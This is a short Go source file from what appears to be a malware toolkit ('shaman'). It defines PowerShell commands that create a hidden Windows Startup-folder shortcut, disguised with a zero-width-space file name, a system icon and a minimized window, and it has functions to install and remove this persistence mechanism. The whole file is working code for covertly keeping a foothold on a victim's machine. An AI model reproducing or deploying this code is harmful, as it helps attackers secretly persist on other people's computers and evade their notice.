package install

import (
	"fmt"

	"github.com/whiterabb17/shaman/package/util"
)

const (
	createCmd = "$w=New-Object -C WScript.Shell;$u=$w.SpecialFolders('Startup')+'\\';$s=$w.CreateShortcut($u+'.lnk');$s.TargetPath='%s';$s.IconLocation='shell32.dll,50';$s.WindowStyle=7;$s.Save();Rename-Item $u'.lnk' ($u+[char]0x200b+'.lnk')"
	removeCmd = "$w=New-Object -C WScript.Shell;$u=$w.SpecialFolders('Startup')+'\\';Remove-Item ($u+[char]0x200b+'.lnk')"
)

// TryFolderInstall attempts to establish persistence by creating a startup shortcut.
func TryFolderInstall() error {
	cmd := fmt.Sprintf(createCmd, "powershell.exe")
	return util.RunPowershell(cmd)
}

// UninstallFolder attempts to remove the startup shortcut.
func UninstallFolder() error {
	return util.RunPowershell(removeCmd)
}
